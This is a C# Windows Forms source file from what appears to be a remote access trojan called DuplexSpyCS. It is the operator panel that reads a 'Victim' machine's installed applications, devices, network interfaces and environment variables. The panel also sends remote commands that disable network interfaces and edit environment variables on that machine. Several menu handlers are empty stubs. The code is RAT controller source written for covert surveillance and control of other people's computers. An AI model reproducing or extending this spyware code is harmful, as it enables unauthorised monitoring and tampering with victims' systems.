using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmSystem : Form
    {
        public Victim v;
        private struct DeviceInfo
        {
            public string Name;
            public string Status;
            public string Manufacturor;
            public string DeviceID;
            public string PNP_Class;
        }
        private Dictionary<string, DeviceInfo> dic_Devices = new Dictionary<string, DeviceInfo>();
        private ImageList il_devices = new ImageList();

        public frmSystem()
        {
            InitializeComponent();
        }

        #region Application

        //APPLICATION
        void init_App()
        {
            //LISTVIEW
            string[] cols =
            {
                "DisplayName",
                "Publisher",
                "DisplayVersion",
                "InstallDate",
                "InstallSource",
                "InstallLocation",
            };
            listView1.Columns.AddRange(cols.Select(x => new ColumnHeader() { Text = x, Width = 200 }).ToArray());

            listView1.View = View.Details;
            listView1.FullRowSelect = true;

            v.encSend(2, 0, "system|app|init");
        }
        public void App_ShowApps(List<string[]> apps)
        {
            foreach (string[] app in apps)
            {
                ListViewItem item = new ListViewItem(app[0]);
                item.SubItems.AddRange(app.Where(x => x != app[0]).Select(x => new ListViewItem.ListViewSubItem() { Text = x }).ToArray());
                Invoke(new Action(() => listView1.Items.Add(item)));
            }

            Invoke(new Action(() => toolStripStatusLabel1.Text = $"Application[{listView1.Items.Count}]"));
        }

        #endregion
        #region Device

        //DEVICES
        void init_Device()
        {
            v.encSend(2, 0, "system|device|init");
        }
        public void Device_ShowDevices(List<string[]> devices)
        {
            TreeNode FindNode(string text)
            {
                TreeNode node = null;
                Invoke(new Action(() =>
                {
                    foreach (TreeNode tmp in treeView1.Nodes)
                    {
                        if (tmp.Text == text)
                        {
                            node = tmp;
                            break;
                        }
                    }
                }));

                return node;
            }

            foreach (string[] device in devices)
            {
                string name = device[0];
                if (name == "X")
                    continue;

                string status = device[1];
                string manu = device[2];
                string id = device[3];
                string pnp_class = device[4];
                string class_guid = device[5];

                dic_Devices.Add(id, new DeviceInfo()
                {
                    Name = name,
                    Status = status,
                    Manufacturor = manu,
                    DeviceID = id,
                    PNP_Class = pnp_class
                });

                Invoke(new Action(() =>
                {
                    TreeNode nClass = FindNode(pnp_class);
                    if (nClass == null)
                    {
                        nClass = new TreeNode(pnp_class);
                        Icon icon = DeviceIconExtract.GetDeviceClassIcon(class_guid);
                        if (icon != null)
                            il_devices.Images.Add(pnp_class, icon);
                        nClass.ImageKey = pnp_class;
                        treeView1.Nodes.Add(nClass);
                    }
                    nClass.Nodes.Add(new TreeNode(name) { ImageKey = nClass.ImageKey });
                }));
            }

            Invoke(new Action(() =>
            {
                toolStripStatusLabel2.Text = $"Class[{treeView1.Nodes.Count}]";
            }));
        }
        private void Device_ReqDetail()
        {
            v.encSend(2, 0, "system|device|detail");
        }
        public void Device_ShowDetail()
        {

        }
        private void Device_SendEnable(bool enable)
        {
            v.encSend(2, 0, "system|device|" + (enable ? "e" : "d"));
        }
        private void Device_Refresh()
        {

        }

        public void DeviceShowInfo(List<Tuple<string, string>> lsInfo)
        {
            Invoke(new Action(() =>
            {
                frmListView f = new frmListView();
                f.Text = "Device Information";
                f.Show();

                f.ShowInfo(lsInfo);
            }));
        }

        #endregion
        #region Interface

        //NETWORK INTERFACE
        void init_if()
        {
            //LISTVIEW
            string[] cols =
            {
                "Name",
                "Description",
                "Type",
                "Status",
                "MAC Address",
            };
            listView2.Columns.AddRange(cols.Select(x => new ColumnHeader() { Text = x, Width = 200 }).ToArray());

            listView2.View = View.Details;
            listView2.FullRowSelect = true;

            v.encSend(2, 0, "system|if|init");
        }
        public void If_ShowInterface(List<string[]> interfaces)
        {
            foreach (string[] i in interfaces)
            {
                ListViewItem item = new ListViewItem(i[0]);
                item.SubItems.AddRange(i.Where(x => x != i[0]).Select(x => new ListViewItem.ListViewSubItem() { Text = x }).ToArray());
                Invoke(new Action(() => listView2.Items.Add(item)));
            }

            Invoke(new Action(() =>
            {
                toolStripStatusLabel3.Text = $"Interface[{listView2.Items.Count}]";
            }));
        }
        private void If_ReqDetail(bool enable)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
                v.encSend(2, 0, $"system|if|enable|{Crypto.b64E2Str(item.Text)}|" + (enable ? "1" : "0"));
        }

        #endregion
        #region Environment Variable

        //ENVIRONMENT VARIABLE
        void init_EV()
        {
            string[] cols =
            {
                "Key",
                "Type",
                "Value",
            };
            listView3.Columns.AddRange(cols.Select(x => new ColumnHeader() { Text = x, Width = 200 }).ToArray());

            listView3.View = View.Details;
            listView3.FullRowSelect = true;

            v.encSend(2, 0, "system|ev|init");
        }
        public void EV_ShowEVs(List<(string, EnvironmentVariableTarget, string)> evs)
        {
            foreach (var x in evs)
            {
                ListViewItem item = new ListViewItem(x.Item1);
                item.SubItems.Add(x.Item2.ToString());
                item.SubItems.Add(x.Item3);

                Invoke(new Action(() =>
                {
                    if (listView3.Groups.Cast<ListViewGroup>().Where(s => s.Name == x.Item2.ToString()).ToArray().Length == 0)
                        listView3.Groups.Add(new ListViewGroup() { Name = x.Item2.ToString(), Header = x.Item2.ToString() });

                    listView3.Items.Add(item);
                    item.Group = listView3.Groups[x.Item2.ToString()];
                }));
            }

            Invoke(new Action(() =>
            {
                toolStripStatusLabel4.Text = $"Type[{listView3.Groups.Count}] Variable[{listView3.Items.Count}]";
            }));
        }

        #endregion

        void setup()
        {
            treeView1.ImageList = il_devices;

            toolStripStatusLabel1.Text = toolStripStatusLabel2.Text = toolStripStatusLabel3.Text = toolStripStatusLabel4.Text = "Loading...";

            init_App();
            init_if();
            init_EV();
            init_Device();
        }

        private void frmSystem_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeView1.SelectedImageKey = treeView1.SelectedNode.ImageKey;
        }

        private void treeView1_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {

        }

        //DEVICE - DETAIL
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }
        //DEVICE - ENABLE
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }
        //DEVICE - DISABLE
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }

        //INTERFACE - ENABLE
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            If_ReqDetail(true);
        }
        //INTERFACE - DISABLE
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            If_ReqDetail(false);
        }

        private void treeView1_DoubleClick(object sender, EventArgs e)
        {
            TreeNode selectedNode = treeView1.SelectedNode;
            if (selectedNode.Parent != null)
            {
                v.SendCommand($"system|device|info|{Crypto.b64E2Str(selectedNode.Text)}");
            }
        }

        //Environment variables - edit
        private void listView3_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items[0];
            string szName = item.Text;
            EnvironmentVariableTarget target = (EnvironmentVariableTarget)Enum.Parse(typeof(EnvironmentVariableTarget), item.SubItems[1].Text);
            string szVals = item.SubItems[2].Text;

            new Thread(() =>
            {
                frmSysEV f = new frmSysEV();
                f.v = v;
                f.g_szEvName = szName;
                f.g_target = target;
                f.g_lsVals = szVals.Split(';').ToList();

                Invoke(new Action(() =>
                {
                    f.Show();
                }));

            }).Start();
        }

        //Device - Expand All
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            treeView1.ExpandAll();
        }
        //Device - Collapse All
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            treeView1.CollapseAll();
        }
    }
}
